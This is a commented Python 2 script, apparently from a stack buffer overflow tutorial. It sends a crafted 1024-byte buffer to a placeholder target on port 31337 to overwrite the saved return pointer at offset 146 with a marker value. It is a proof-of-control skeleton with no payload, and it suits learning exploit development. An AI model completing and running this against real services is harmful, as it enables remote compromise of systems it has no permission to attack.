#!/usr/bin/env python2
import socket

# configure the IP and port we're connecting to
RHOST = "<target-ip-here>"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# specify the lengths of the offset and the total buffer

buf_totlen = 1024
offset_srp = 146

# Create the buffer to be sent
buf = ""
buf += "A" * (offset_srp - len(buf)) # padding
buf += "BBBB" # Overwrite for the saved return pointer
buf += "CCCC" # The ESP should point to this value because it is incremented by 4
buf += "D" * (buf_totlen - len(buf)) # Follow-up padding, this is done because programs might behave differently
				     # with different sized buffers. Until you confirm that it is a non-issue, keep
				     # the length the same.
buf += "\n"

# send a message down the socket
s.send(buf)

# print out what we sent
print("Sent: {0}".format(buf))

# receive some data from the socket
data = s.recv(1024)

# print out what was received
print("Received: {0}".format(data))
